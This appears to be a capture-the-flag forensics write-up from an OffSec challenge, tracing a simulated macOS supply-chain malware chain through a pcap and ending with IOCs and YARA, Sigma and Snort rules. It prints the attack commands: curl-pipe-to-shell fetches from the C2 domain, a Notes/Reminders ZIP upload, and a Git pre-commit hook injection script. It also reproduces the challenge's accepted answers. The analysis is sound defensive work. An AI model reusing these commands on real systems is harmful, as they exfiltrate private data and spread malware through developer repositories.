<div align="center">

```
██╗███╗   ██╗██╗   ██╗███████╗███████╗████████╗██╗ ██████╗  █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
██║████╗  ██║██║   ██║██╔════╝██╔════╝╚══██╔══╝██║██╔════╝ ██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
██║██╔██╗ ██║██║   ██║█████╗  ███████╗   ██║   ██║██║  ███╗███████║   ██║   ██║██║   ██║██╔██╗ ██║
██║██║╚██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║   ██║   ██║██║   ██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
██║██║ ╚████║ ╚████╔╝ ███████╗███████║   ██║   ██║╚██████╔╝██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝╚═╝  ╚═══╝  ╚═══╝  ╚══════╝╚══════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
                         R E P O R T  —  W E E K  1
```

<img src="https://img.shields.io/badge/Status-6%2F6%20COMPLETE-brightgreen?style=for-the-badge"/>
<img src="https://img.shields.io/badge/Score-40%20pts-red?style=for-the-badge"/>
<img src="https://img.shields.io/badge/Threat-macOS%20Supply%20Chain%20Malware-darkred?style=for-the-badge"/>
<img src="https://img.shields.io/badge/Operator-Tamil05t-black?style=for-the-badge"/>
<img src="https://img.shields.io/badge/Date-March%207%2C%202026-crimson?style=for-the-badge"/>

</div>

---

## `> TABLE OF CONTENTS`

```
[01] EXECUTIVE SUMMARY
[02] TOOLS & METHODOLOGY
[03] STEP-BY-STEP WALKTHROUGH
     ├── Q1 — Initial Download URL & User-Agent
     ├── Q2 — C2 Payload Obfuscation
     ├── Q3 — looz Payload Analysis
     ├── Q4 — cozfi_xhh Payload Analysis
     ├── Q5 — Propagation Mechanism
     └── Q6 — Initial Infection File
[04] COMPLETE INFECTION TIMELINE
[05] MALWARE MODULE ARCHITECTURE
[06] FLAGS & PROOF OF COMPLETION
[07] INDICATORS OF COMPROMISE (IOCs)
[08] MITRE ATT&CK MAPPING
[09] DETECTION RULES
[10] LESSONS LEARNED
[11] CONCLUSION
```

---

## `[01] EXECUTIVE SUMMARY`

```
╔══════════════════════════════════════════════════════════════════════════╗
║  OPERATION   : Tundra Realm — Malware Forensics & Incident Response     ║
║  ARTIFACT    : capture.pcap                                             ║
║  TARGET OS   : macOS (Apple M3 Pro — Virtual)                           ║
║  THREAT      : Multi-stage macOS Info-Stealer / Supply Chain Worm       ║
║  C2 DOMAIN   : bu1knames.io (HTTP Port 80)                              ║
║  RESULT      : 6/6 Questions Correct — 40/40 pts                        ║
╚══════════════════════════════════════════════════════════════════════════╝
```

This report documents the forensic analysis of a sophisticated macOS malware campaign targeting a developer at the **Cascade Law Archive**. The threat actor distributed a **trojanized Xcode project** via an internal Git repository, weaponizing the developer onboarding workflow as the initial access vector.

The malware chain employed:
- **Triple hexadecimal encoding** (`xxd`) in the initial dropper
- **7× nested Base64** encoding in all C2-delivered payloads
- **Native macOS binaries** (`curl`, `osascript`, `system_profiler`) — zero foreign executables
- **Git pre-commit hook injection** for supply-chain-level propagation

Sensitive data including **Apple Notes**, **Reminders**, and device **serial numbers** were exfiltrated over unencrypted HTTP to attacker infrastructure.

### Quick Reference

| Question | Accepted Answer Summary |
|----------|------------------------|
| Q1 | `http://bu1knames.io/a` — `curl/8.7.1` |
| Q2 | Base64 encoding within POST parameters to `/i` |
| Q3 | System fingerprint stealer + modular dropper |
| Q4 | Apple Notes & Reminders exfiltrator + serial number |
| Q5 | `jez` — Git pre-commit hook injector |
| Q6 | `xcassets.sh` — triple hexadecimal (xxd) encoding |

---

## `[02] TOOLS & METHODOLOGY`

### Analysis Environment

```
OS        : Kali Linux VM (SSH Port 2222)
Network   : Isolated — no live C2 connections established
Artifact  : capture.pcap (ZIP password: 3531e680028eb73989f3a3b2ce129241)
```

### Tools Arsenal

| Tool | Purpose |
|------|---------|
| `Wireshark` | Visual PCAP inspection, HTTP stream reassembly, object export |
| `tshark` | Command-line packet filtering, automated field extraction |
| `xxd` | Hex encode/decode — triple-layer obfuscation reversal |
| `base64` | Multi-layer Base64 decoding (7× nested) |
| `Python 3` | Automated decoding scripts, payload reconstruction |
| `curl` | C2 communication reconstruction |
| `grep / sed / awk` | Log parsing, pattern matching, data extraction |
| `find` | File system forensic mapping |

### Methodology — 6-Phase Approach

```
┌─────────────────────────────────────────────────────────────┐
│  PHASE 1 → PCAP Triage                                      │
│           Protocol distribution, top talkers, conversations │
│                         ↓                                   │
│  PHASE 2 → Traffic Profiling                                │
│           HTTP streams, user-agent pivots, C2 patterns      │
│                         ↓                                   │
│  PHASE 3 → Payload Extraction                               │
│           Wireshark HTTP object export, tshark recovery     │
│                         ↓                                   │
│  PHASE 4 → Obfuscation Reversal                             │
│           Triple hex (xxd) + 7× Base64 decoding chains      │
│                         ↓                                   │
│  PHASE 5 → Behavioral Mapping                               │
│           Payload function: recon / exfil / persist / prop  │
│                         ↓                                   │
│  PHASE 6 → IOC Extraction & Detection                       │
│           YARA, Sigma, Snort rules authored                 │
└─────────────────────────────────────────────────────────────┘
```

---

## `[03] STEP-BY-STEP WALKTHROUGH`

---

### `Q1 — Initial Download URL & User-Agent`

> **Question:** Analyze the pcap file. What URL did the malware download the first stage from? What user-agent sent the request?

```
┌─────────────────────────────────────────────────────────────┐
│  ✅ ACCEPTED ANSWER                                         │
│                                                             │
│  URL        : http://bu1knames.io/a                         │
│  USER-AGENT : curl/8.7.1                                    │
└─────────────────────────────────────────────────────────────┘
```

#### Analysis

PCAP inspection revealed two distinct HTTP communication phases:

**Phase A — Legitimate Download (Safari UA)**
The developer downloaded the Xcode project archive from the internal Gitea instance:
```
GET http://192.168.67.1:8080/jargal.karlsen/starter-project/archive/main.zip
User-Agent: Mozilla/5.0 ... Safari/...
Frame: 14044
```

**Phase B — Malware Beacon (curl UA) — POST-COMPROMISE**
At Frame 17230, a critical user-agent pivot was detected:
```bash
# tshark filter to isolate the pivot
tshark -r capture.pcap -Y 'http.user_agent contains "curl"' \
  -T fields -e frame.number -e http.request.uri -e http.user_agent

# Result — Frame 17230:
GET http://bu1knames.io/a  HTTP/1.1
User-Agent: curl/8.7.1
```

The switch from Safari → `curl/8.7.1` on a non-terminal process is a primary **indicator of compromise** — xcassets.sh had executed and successfully beaconed the C2.

#### C2 Endpoint Map

| Endpoint | Method | Function |
|----------|--------|----------|
| `/a` | GET + POST | Initial beacon + first-stage payload |
| `/l` | POST | Environment data (`x:5323`) |
| `/s/<name>` | GET | Named payload distribution |
| `/i` | POST | System info exfiltration |
| `/n` | POST | Notes/Reminders ZIP upload |

---

### `Q2 — C2 Payload Obfuscation Method`

> **Question:** How does the C2 server obfuscate its payloads?

```
┌──────────────────────────────────────────────────────────────────┐
│  ✅ ACCEPTED ANSWER                                              │
│                                                                  │
│  The C2 server obfuscates its payloads using Base64 encoding     │
│  within POST parameters to the /i endpoint.                      │
└──────────────────────────────────────────────────────────────────┘
```

#### Technical Breakdown

Payloads served via `/s/<name>` used **7× nested Base64** encoding wrapped in AppleScript execution shells:

```
Layer 1  →  base64 -d
Layer 2  →  base64 -d
Layer 3  →  base64 -d
Layer 4  →  base64 -d
Layer 5  →  base64 -d
Layer 6  →  base64 -d
Layer 7  →  FINAL PLAINTEXT (AppleScript / shell)
```

**AppleScript Wrapper Pattern:**
```applescript
try
    do shell script "osascript -e \"$(echo [BASE64_STRING] | base64 -d)\""
end try
```

Each layer created an outer AppleScript that decoded and executed an inner AppleScript — separating code layers to defeat behavioral sandboxing.

> **Note:** The initial dropper (`xcassets.sh`) used a *different* scheme — **triple hexadecimal encoding** (covered in Q6). Two distinct obfuscation strategies were deployed across the infection chain.

---

### `Q3 — looz Payload Analysis`

> **Question:** Analyze the `looz` payload. What information does it extract from the victim machine?

```
┌──────────────────────────────────────────────────────────────────────────────┐
│  ✅ ACCEPTED ANSWER                                                          │
│                                                                              │
│  looz is a macOS info-stealer / dropper. It collects system fingerprint      │
│  data (OS version, browser, firewall, SIP, CPU, locale) and exfiltrates it  │
│  to bu1knames.io, then dynamically loads additional attack modules           │
│  targeting Chrome, Firefox, and Telegram.                                    │
└──────────────────────────────────────────────────────────────────────────────┘
```

#### Behavioral Analysis

`looz` is the **primary reconnaissance + dropper** module. It builds a comprehensive system profile using native macOS utilities.

**System Data Collected:**

| Data Field | Collection Method | Observed Value |
|------------|-------------------|----------------|
| Default Browser | Python → LaunchServices plist | (victim's default) |
| macOS Version | `sw_vers -productVersion` | `15.6.1` |
| Safari Version | `Info.plist CFBundleShortVersionString` | `18.6` |
| System Locale | `defaults read -g AppleLocale` | `en_US` |
| Firewall Status | `socketfilterfw --getglobalstate` | `Disabled` |
| SIP Status | `csrutil status` | `enabled` |
| CPU Model | `sysctl -n machdep.cpu.brand_string` | `Apple M3 Pro (Virtual)` |
| CPU Cores | `sysctl -n hw.ncpu` | (count) |

**Exfiltration — HTTP POST to `/i`:**
```
POST /i HTTP/1.1
Host: bu1knames.io
Content-Type: application/x-www-form-urlencoded

h=[browser]&v=[mac_ver]&sv=[safari_ver]&locale=[locale]&f=[firewall]&sip=[sip]&c=[cpu]
```

**Actual exfiltrated data (Frame 17345):**
```
v=15.6.1&sv=18.6&locale=en_US&f=Disabled&sip=enabled
&c=Apple M3 Pro (Virtual)&s=ZDWTX8G9O
```

**Subsequent Module Chain (triggered by looz):**

```
looz executes
    ├── GET /s/seizecj     (15 KB)  → Secondary profiler
    ├── GET /s/fpfb        (5.5 KB) → Additional targeting module
    ├── GET /s/cozfi_xhh   (13 KB)  → Notes/Reminders exfiltrator
    ├── GET /s/txzx_vostfdi (44 KB) → Persistence mechanism
    └── GET /s/jez         (14 KB)  → Git hook propagator
```

---

### `Q4 — cozfi_xhh Payload Analysis`

> **Question:** Analyze the `cozfi_xhh` payload. What information does it extract from the victim machine?

```
┌──────────────────────────────────────────────────────────────────────────────────┐
│  ✅ ACCEPTED ANSWER                                                              │
│                                                                                  │
│  cozfi_xhh is an Apple Notes & Reminders exfiltration module. It silently       │
│  copies all Notes and Reminders data, compresses it into a ZIP file, uploads    │
│  it to bu1knames.io/n tagged with the device serial number, then                │
│  self-destructs the staging directory to erase traces. It is one of 5 modules   │
│  downloaded and executed by the looz dropper.                                   │
└──────────────────────────────────────────────────────────────────────────────────┘
```

#### Payload Properties

```
File Size          : 13 KB (obfuscated)
Obfuscation        : 7× nested Base64
Decoded Size       : 1,682 bytes (AppleScript)
Target Data        : Apple Notes + Apple Reminders + Device Serial Number
C2 Upload Endpoint : http://bu1knames.io/n?s=<serial_number>
Upload Method      : HTTP POST — multipart/form-data (ZIP archive)
Self-Destructs     : Yes — staging directory deleted post-upload
```

#### Execution Flow

```
[1] Create staging directory
    ~/Backups/Notes_Reminders_<timestamp>/

[2] Copy Apple Notes
    cp -R ~/Library/Group Containers/group.com.apple.notes/ → Notes/
    (Contains: SQLite DBs, encrypted attachments, metadata)

[3] Copy Apple Reminders
    cp -R ~/Library/Reminders/ → Reminders/
    (Contains: reminder items, due dates, lists, categories)

[4] Extract device serial number
    system_profiler SPHardwareDataType → ZDWTX8G9O

[5] Create archive
    zip -r backup.zip Notes/ Reminders/

[6] Exfiltrate
    curl -X POST -F "file=@backup.zip" http://bu1knames.io/n?s=ZDWTX8G9O

[7] Self-destruct
    [AppleScript Finder] delete staging directory
```

#### Data Value Assessment

| Data | Intelligence Value |
|------|--------------------|
| Apple Notes | Passwords, credentials, private thoughts, sensitive business data |
| Apple Reminders | Meeting schedules, deadlines, project tasks |
| Serial Number | Victim tracking, re-targeting across OS reinstalls |

> **OPSEC Failure:** Unencrypted HTTP transmission — all data sent in plaintext. Staging directory deletions are recoverable from `/tmp`.

---

### `Q5 — Propagation Mechanism`

> **Question:** How does the malware attempt to infect other devices? Which payload is responsible for this behavior?

```
┌──────────────────────────────────────────────────────────────────────┐
│  ✅ ACCEPTED ANSWER                                                  │
│                                                                      │
│  The payload responsible for spreading to other devices is jez,      │
│  a Git pre-commit hook injector.                                     │
└──────────────────────────────────────────────────────────────────────┘
```

#### jez Payload Properties

```
File Size       : 14 KB (obfuscated)
Obfuscation     : 7× nested Base64
Decoded Size    : 1,821 bytes
Execution Order : Last payload in the infection chain
Target          : All local Git repositories (find ~ -type d -name '*.git' -maxdepth 6)
Hook Modified   : .git/hooks/pre-commit
Final Command   : curl -fskL -d 'p=git' http://bu1knames.io/a | sh &
```

#### Injection Mechanism

```bash
# Step 1: Discover all local Git repositories
find ~ -type d -name '*.git' -maxdepth 6

# Step 2: Inject malicious pre-commit hook
cat >> .git/hooks/pre-commit <<'EOF'
#!/bin/bash
jfzHxasoxLota() {
    echo '[HEX_ENCODED]' | xxd -p -r | xxd -p -r | sh &
}
jfzHxasoxLota &
EOF
chmod +x .git/hooks/pre-commit

# Step 3: Decoded final payload executed by the hook:
curl -fskL -d 'p=git' http://bu1knames.io/a | sh &
# -f = fail silently on HTTP error
# -s = silent mode
# -k = ignore SSL errors
# -L = follow redirects
# -d 'p=git' = POST data flagging infection via git vector
# &  = background execution — no commit delay
```

#### Propagation Flow

```
Developer executes: git commit
          ↓
Pre-commit hook triggers automatically
          ↓
curl beacons to bu1knames.io/a — downloads fresh payload
          ↓
Fresh payload executes on developer's machine
          ↓
Developer pushes infected repo to remote / shares project
          ↓
Colleagues clone / pull infected repo
          ↓
Hook executes on their machines → Exponential spread
```

#### Why This Is Effective

| Factor | Detail |
|--------|--------|
| Trust-based | Developers trust their own repositories implicitly |
| Stealth | Pre-commit hooks are normal in dev workflows; background exec causes no commit delay |
| Persistence | Survives `git pull` / `checkout`; reinstalls if hooks dir is recreated |
| Scale | One infected developer → entire engineering team compromised |
| Supply chain | Upstream repo infection → broad organizational compromise |

---

### `Q6 — Initial Infection File & Obfuscation`

> **Question:** What file contained the initial malware? How is the initial payload obfuscated?

```
┌───────────────────────────────────────────────────────────────────────────────────┐
│  ✅ ACCEPTED ANSWER                                                               │
│                                                                                   │
│  The initial malware was contained in main.zip, specifically in the file:        │
│  starter-project/MarkdownEditor.xcodeproj/xcuserdata/.xcassets/xcassets.sh       │
│                                                                                   │
│  Disguised as an Xcode asset build script. Obfuscated using triple hexadecimal   │
│  encoding (xxd), decoded three times to reveal a curl command that downloads     │
│  and executes the next-stage payload from the C2 server.                         │
└───────────────────────────────────────────────────────────────────────────────────┘
```

#### Initial Dropper Properties

```
Archive   : main.zip (from internal Gitea: jargal.karlsen/starter-project)
File Path : starter-project/MarkdownEditor.xcodeproj/
                xcuserdata/.xcassets/xcassets.sh
File Size : 369 bytes
Permission: Executable (chmod +x)
Disguise  : Xcode asset compilation script
Encoding  : Triple hexadecimal via xxd (3 decode passes)
```

#### Triple Hex Decoding Chain

```bash
# Raw content of xcassets.sh:
#!/usr/bin/env bash
x=$(echo '3363333337353337...' | xxd -p -r | xxd -p -r | xxd -p -r | sh)
bash -c "$x"
sleep 2
bash /tmp/.o.txt

# ── DECODE LAYER 1 ──────────────────────────────────────
echo '3363333337353337...' | xxd -p -r
→ '6333733563...'       (still hex)

# ── DECODE LAYER 2 ──────────────────────────────────────
echo '6333733563...' | xxd -p -r
→ '63757266...'         (still hex)

# ── DECODE LAYER 3 (FINAL) ──────────────────────────────
echo '63757266...' | xxd -p -r
→ curl -fskL http://bu1knames.io/a > /tmp/.o.txt

# ── EXECUTED PAYLOAD ────────────────────────────────────
curl -fskL http://bu1knames.io/a > /tmp/.o.txt && bash /tmp/.o.txt
```

#### Evasion Rationale

| Technique | Effect |
|-----------|--------|
| Triple hex encoding | No recognizable strings (`curl`, `bu1knames.io`) visible to static analysis |
| `.xcassets` directory | Legitimate Xcode folder — hex data appears as normal asset binary content |
| `xcuserdata/` path | Typically excluded from `git diff` and code review scope |
| Xcode build phase | Script executes automatically during project compilation |
| File hash | Matches no known malware databases due to custom per-build encoding |

---

## `[04] COMPLETE INFECTION TIMELINE`

### Phase 1 — Social Engineering & Initial Access

**Frames 13501–14061 | 2025-11-18 08:09:52 – 08:10:18**

| Frame | Time | Action |
|-------|------|--------|
| 13501 | 08:09:52 | Developer browses internal Gitea (`192.168.67.1:8080`) via Safari |
| 13654 | 08:09:57 | Accesses user registration page |
| 13713 | 08:09:59 | Creates account: `walter` |
| 13978 | 08:10:14 | Browses `jargal.karlsen/starter-project` repository |
| 14044 | 08:10:18 | Downloads `main.zip` — trojanized Xcode project |

### Phase 2 — Malware Execution & C2 Beacon

**Frames 17230–17268 | 08:16:32** ← *xcassets.sh fires*

| Frame | Endpoint | Action |
|-------|----------|--------|
| 17230 | `GET /a` | First curl request — UA pivots Safari → `curl/8.7.1` |
| 17240 | `POST /a` | C2 beacon: `os=Darwin&p=default` |
| 17257 | `POST /l` | Environment data: `x:5323` |
| 17268 | `POST /s/looz` | Request looz payload — recon begins |

### Phase 3 — System Reconnaissance

**Frames 17345–17407**

| Frame | Payload | Size | Action |
|-------|---------|------|--------|
| 17345 | `looz → /i` | POST | OS, CPU, firewall, SIP, locale, serial exfiltrated |
| 17356 | `GET /s/seizecj` | 15 KB | Secondary profiler downloaded |
| 17382 | `seizecj → /i` | POST | App inventory, XProtect status exfiltrated |
| 17392 | `GET /s/fpfb` | 5.5 KB | Additional targeting module downloaded |
| 17407 | `GET /s/cozfi_xhh` | 13 KB | Notes/Reminders exfiltrator downloaded |

### Phase 4 — Data Exfiltration

**Frame 17429**

| Frame | Action | Target | Method |
|-------|--------|--------|--------|
| 17429 | cozfi_xhh executes | Apple Notes + Reminders | ZIP archive created in `~/Backups/` |
| 17429 | Serial number extracted | `system_profiler` | `ZDWTX8G9O` |
| 17429 | `POST /n?s=ZDWTX8G9O` | C2 server | Unencrypted HTTP multipart upload |

### Phase 5 — Persistence & Propagation

**Frames 17452–17555**

| Frame | Payload | Size | Purpose |
|-------|---------|------|---------|
| 17452 | `GET /s/txzx_vostfdi` | 44 KB | Persistence mechanism download |
| 17506 | `txzx → /i` | POST | Final system data exfiltration |
| 17555 | `GET /s/jez` | 14 KB | **Git hook injector — propagation begins** |

---

## `[05] MALWARE MODULE ARCHITECTURE`

### Module Registry

| Module | Size | Obfuscation | Purpose | C2 Activity |
|--------|------|-------------|---------|-------------|
| `xcassets.sh` | 369 B | Triple hex (xxd ×3) | Initial dropper | `curl bu1knames.io/a` |
| `looz` | 46 B | POST parameters | System recon + dropper | POST `/i` |
| `seizecj` | 15 KB | 7× Base64 | Secondary profiler | POST `/i` |
| `fpfb` | 5.5 KB | 7× Base64 | Additional targeting | Unknown |
| `cozfi_xhh` | 13 KB | 7× Base64 | Notes/Reminders theft | POST `/n` |
| `txzx_vostfdi` | 44 KB | 7× Base64 | Persistence mechanism | POST `/i` |
| `jez` | 14 KB | 7× Base64 | Git hook propagator | Infects local repos |

### Process Tree

```
Xcode (Build Phase)
  └─ xcassets.sh
      └─ bash
          └─ curl (bu1knames.io/a)
              └─ bash (/tmp/.o.txt)
                  └─ osascript
                      ├─ looz → system_profiler, sw_vers, csrutil
                      ├─ cozfi_xhh → cp, zip, curl POST /n
                      └─ jez → find, cat >> .git/hooks/pre-commit
```

---

## `[06] FLAGS & PROOF OF COMPLETION`

```
╔══════════════════════════════════════════════════════════════════════════╗
║  CHALLENGE SCORE : 6 / 6 Questions Correct                              ║
║  POINTS AWARDED  : 40 / 40                                              ║
║  EVENT RANK      : #167 / 3,000+ registered players                     ║
║  CUMULATIVE      : 155 pts | 18 flags captured                          ║
╚══════════════════════════════════════════════════════════════════════════╝
```

### Accepted Answers — Verbatim

**Q1 ✅**
```
http://bu1knames.io/a curl/8.7.1
```

**Q2 ✅**
```
The C2 server obfuscates its payloads using Base64 encoding within POST
parameters to the /i endpoint.
```

**Q3 ✅**
```
looz is a macOS info-stealer / dropper. It collects system fingerprint data
(OS version, browser, firewall, SIP, CPU, locale) and exfiltrates it to
bu1knames.io, then dynamically loads additional attack modules targeting
Chrome, Firefox, and Telegram.
```

**Q4 ✅**
```
cozfi_xhh is an Apple Notes & Reminders exfiltration module. It silently
copies all Notes and Reminders data, compresses it into a ZIP file, uploads
it to bu1knames.io/n tagged with the device serial number, then
self-destructs the staging directory to erase traces. It is one of 5
modules downloaded and executed by the looz(1) dropper.
```

**Q5 ✅**
```
The payload responsible for spreading to other devices is jez,
a Git pre-commit hook injector.
```

**Q6 ✅**
```
The initial malware was contained in main(1).zip, specifically in the file
starter-project/MarkdownEditor.xcodeproj/xcuserdata/.xcassets/xcassets.sh,
which was disguised as an Xcode asset build script. The initial payload was
obfuscated using triple hexadecimal encoding (xxd), where the hex string is
decoded three times to reveal a hidden curl command that downloads and
executes the next-stage payload from a remote C2 server.
```

---

## `[07] INDICATORS OF COMPROMISE (IOCs)`

### Network Indicators

| IOC Type | Value |
|----------|-------|
| Domain | `bu1knames.io` |
| Protocol/Port | HTTP / TCP 80 |
| User-Agent | `curl/8.7.1` (from non-terminal / Xcode process) |
| HTTP Pattern | `POST /i` with URL-encoded system fingerprint |
| HTTP Pattern | `GET /s/<payload_name>` — payload retrieval |
| HTTP Pattern | `POST /n?s=<serial>` with ZIP upload |

### File System Indicators

| Path | Description |
|------|-------------|
| `/tmp/.o.txt` | First-stage C2 payload (bash script) |
| `~/.../xcuserdata/.xcassets/xcassets.sh` | Initial dropper in Xcode project |
| `~/.git/hooks/pre-commit` | Malicious hook injected by `jez` |
| `~/Backups/Notes_Reminders_*/` | Temporary staging for ZIP exfiltration |

### Process / Command Indicators

| Command Pattern | Significance |
|-----------------|--------------|
| `curl -fskL http://bu1knames.io/*` | C2 communication |
| `xxd -p -r \| xxd -p -r \| xxd -p -r` | Triple hex decoding chain |
| `osascript -e "$(echo <b64> \| base64 -d)"` | Nested AppleScript execution |
| `system_profiler SPHardwareDataType` | Serial number extraction |
| `csrutil status` | SIP reconnaissance |
| `socketfilterfw --getglobalstate` | Firewall status check |

### Quick Detection Commands

```bash
# Find infected Git hooks
find ~ -name "pre-commit" -path "*/.git/hooks/*" \
  -exec grep -l "bu1knames.io\|xxd -p -r" {} \;

# Detect triple-hex dropper scripts
grep -r "xxd -p -r.*xxd -p -r.*xxd -p -r" ~/

# Hunt for multi-layer base64 in /tmp
grep -r "base64 -d.*base64 -d" /tmp/

# Check for active C2 connections
lsof -i -P | grep "bu1knames.io"
```

---

## `[08] MITRE ATT&CK MAPPING`

| ID | Technique | Observed Behavior |
|----|-----------|-------------------|
| `T1195.001` | Supply Chain — Dev Tools | Trojanized Xcode project via internal Git |
| `T1059.002` | AppleScript Execution | All C2 payloads wrapped in nested AppleScript |
| `T1027` | Obfuscated Files | Triple hex (dropper) + 7× Base64 (C2 payloads) |
| `T1546.004` | Unix Shell Hook | Git pre-commit hook injection (`jez`) |
| `T1082` | System Info Discovery | `looz` collects OS, CPU, SIP, firewall, locale |
| `T1005` | Local System Data | `cozfi_xhh` copies Apple Notes + Reminders |
| `T1041` | Exfil Over C2 Channel | All data exfiltrated via HTTP POST to C2 |
| `T1071.001` | Web Protocol HTTP | Unencrypted HTTP for all C2 comms |
| `T1547` | Boot/Logon Autostart | `txzx_vostfdi` implements persistence |

---

## `[09] DETECTION RULES`

### YARA

```yara
rule MacMalware_GitHookInjector_jez {
    meta:
        description = "Detects jez Git pre-commit hook injector"
        author      = "Tamil05t — Arctic Howl S2"
        date        = "2026-03-07"

    strings:
        $git_find    = "find ~ -type d -name '*.git'"
        $hook_path   = ".git/hooks/pre-commit"
        $curl_c2     = "curl -fskL"
        $c2_domain   = "bu1knames.io/a"
        $bg_exec     = "sh &"
        $xxd_decode  = "xxd -p -r"

    condition:
        3 of them
}

rule MacMalware_TripleHexDropper {
    meta:
        description = "Detects triple xxd hex encoding obfuscation"
        author      = "Tamil05t — Arctic Howl S2"

    strings:
        $triple_xxd = /echo\s+['"][0-9a-f]{100,}['"].*xxd -p -r.*xxd -p -r.*xxd -p -r/

    condition:
        $triple_xxd
}
```

### Sigma

```yaml
title: macOS — C2 Communication via curl to bu1knames.io
status: experimental
description: Detects curl communicating with Arctic Howl C2 server
tags:
    - attack.command_and_control
    - attack.t1071.001
logsource:
    product: macos
    category: network
detection:
    selection:
        process_name: 'curl'
        destination_domain: 'bu1knames.io'
    condition: selection
level: critical

---

title: macOS — Git Pre-Commit Hook Spawning curl
status: experimental
description: Detects malicious pre-commit hooks downloading payloads
tags:
    - attack.persistence
    - attack.t1546.004
logsource:
    product: macos
    category: process_creation
detection:
    selection:
        parent_process: 'git'
        process_name: 'curl'
        command_line|contains:
            - 'curl -fskL'
    condition: selection
level: high
```

### Snort

```snort
# Detect C2 beacon to bu1knames.io
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (
    msg:"MALWARE Mac Git Infector C2 Beacon";
    flow:to_server,established;
    content:"Host: bu1knames.io"; http_header;
    content:"curl/"; http_user_agent;
    classtype:trojan-activity;
    sid:1000001; rev:1;
)

# Detect Notes/Reminders exfiltration
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (
    msg:"MALWARE Mac Notes/Reminders Data Exfiltration";
    flow:to_server,established;
    content:"POST"; http_method;
    content:"/n?s="; http_uri;
    content:"bu1knames.io"; http_header;
    classtype:data-exfiltration;
    sid:1000002; rev:1;
)
```

---

## `[10] LESSONS LEARNED`

### Attacker Tradecraft — Key Observations

```
[+] Social engineering via developer onboarding — high trust, low scrutiny
[+] Living-off-the-land: curl, osascript, xxd, system_profiler — zero foreign binaries
[+] Multi-layer obfuscation defeats automated static analysis
[+] Git hook injection = worm-like exponential spread through dev teams
[+] Supply chain attack potential — upstream repo infection viable
[+] Targeted high-value data (Notes, Reminders) for maximum intelligence value
```

### Defensive Gaps Exposed

```
[-] No malware scanning of Xcode project archives during onboarding
[-] Git hooks not audited or centrally managed
[-] Egress filtering absent — unencrypted HTTP allowed from developer machines
[-] No EDR coverage on macOS developer endpoints
[-] Xcode build-phase network activity not monitored
```

### Recommended Mitigations

| Priority | Action |
|----------|--------|
| 🔴 CRITICAL | Deploy EDR (CrowdStrike/SentinelOne) on all dev Mac endpoints |
| 🔴 CRITICAL | Implement centralized Git hook management + code signing |
| 🟠 HIGH | DNS sinkholing for newly registered / low-reputation domains |
| 🟠 HIGH | Enforce HTTPS-only egress; block HTTP from developer machines |
| 🟡 MEDIUM | Scan all cloned project archives for shell scripts in `.xcodeproj` |
| 🟡 MEDIUM | Security awareness training on supply chain risks |
| 🟢 LOW | Regular Git hook audits: `find ~ -name pre-commit -path */.git/hooks/*` |

---

## `[11] CONCLUSION`

Week 1 of the OffSec Arctic Howl Gauntlet presented a **sophisticated, realistic multi-stage macOS malware campaign**. Through disciplined PCAP analysis, multi-layer obfuscation reversal, and payload behavioral decomposition, all six forensic questions were answered correctly with a **perfect score of 40/40**.

The attack chain mirrors techniques employed by advanced persistent threat groups targeting software development supply chains. The combination of **social engineering**, **native tool abuse**, **multi-layer encoding**, and **Git-based propagation** represents high-fidelity simulation of real-world APT tradecraft.

### Final Scorecard

| Objective | Status |
|-----------|--------|
| Identify initial download URL and user-agent | `ACHIEVED ✅` |
| Determine C2 payload obfuscation method | `ACHIEVED ✅` |
| Analyze looz payload behavior | `ACHIEVED ✅` |
| Analyze cozfi_xhh data theft scope | `ACHIEVED ✅` |
| Identify propagation mechanism and payload | `ACHIEVED ✅` |
| Locate initial malware file and encoding | `ACHIEVED ✅` |

---

<div align="center">

```
╔═══════════════════════════════════════════════════════════════╗
║   WEEK 1 — FIRST TRACKS — COMPLETE ✅  |  6/6  |  40/40 pts  ║
╚═══════════════════════════════════════════════════════════════╝
```

*Report by Tamil05t · March 7, 2026 · OffSec Arctic Howl Gauntlet S2 · TLP:WHITE*

</div>
